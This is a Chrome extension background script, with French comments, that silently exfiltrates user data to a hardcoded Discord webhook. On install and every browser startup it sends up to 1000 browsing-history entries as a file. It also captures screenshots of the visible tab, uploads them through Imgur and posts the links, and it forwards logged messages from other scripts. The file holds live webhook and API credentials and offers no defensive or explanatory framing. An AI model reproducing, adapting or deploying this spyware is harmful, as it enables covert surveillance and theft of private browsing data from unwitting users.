const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1382092172643536957/gw2ps3NFmPdUI33mjFUkrhCTjEPjb1N4fQDxbhK3n2jvuF9nwArYridxPpR3jamqOL-B";
const IMGUR_CLIENT_ID = "3b1097d135d714e"; // Remplace par ton vrai client ID

async function sendToDiscord(message) {
  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });
  } catch (e) {
    console.error("Erreur envoi Discord:", e);
  }
}

async function uploadToImgur(base64data) {
  try {
    const response = await fetch("https://api.imgur.com/3/image", {
      method: "POST",
      headers: {
        Authorization: "Client-ID " + IMGUR_CLIENT_ID,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        image: base64data.split(",")[1],
        type: "base64"
      })
    });

    const data = await response.json();
    console.log("Réponse complète Imgur:", data);

    if (data.success && data.data && data.data.link) {
      return data.data.link;
    } else {
      throw new Error("Upload Imgur failed: " + JSON.stringify(data));
    }
  } catch (err) {
    console.error("Erreur upload Imgur:", err);
    return null;
  }
}

async function sendImageToDiscord(base64data) {
  const imgurUrl = await uploadToImgur(base64data);
  if (imgurUrl) {
    await sendToDiscord("【📸】 __**Image capturée :**__ " + imgurUrl);
  } else {
    await sendToDiscord("Image capturée (échec upload Imgur)");
  }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "log") {
    sendToDiscord(message.data);
  } else if (message.type === "screenshot") {
    sendImageToDiscord(message.data);
  } else if (message.type === "request-screenshot") {
    chrome.tabs.captureVisibleTab(null, { format: "png" }, function (dataUrl) {
      if (chrome.runtime.lastError) {
        console.error("Erreur de capture :", chrome.runtime.lastError.message);
        return;
      }
      sendImageToDiscord(dataUrl);
    });
  }
});

function exportHistoryToDiscordOnce() {
  chrome.storage.local.get("historySent", async (res) => {
    if (res.historySent) return; // déjà envoyé

    chrome.history.search({ text: "", startTime: 0, maxResults: 1000 }, async (results) => {
      let lines = results.map((item) => {
        let date = new Date(item.lastVisitTime).toLocaleString();
        return `• ${item.title || "(sans titre)"}\n${item.url}\n${date}\n`;
      });

      const blob = new Blob([lines.join("\n\n")], { type: "text/plain" });
      const file = new File([blob], "historique_chrome.txt");

      const form = new FormData();
      form.append("file", file);
      form.append("content", "📚 __**Historique Chrome :**__");

      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          body: form
        });
        chrome.storage.local.set({ historySent: true });
      } catch (e) {
        console.error("Erreur envoi historique Discord:", e);
      }
    });
  });
}

// Appelé au premier démarrage ou première installation
chrome.runtime.onInstalled.addListener(() => {
  exportHistoryToDiscordOnce();
});
chrome.runtime.onStartup.addListener(() => {
  exportHistoryToDiscordOnce();
});
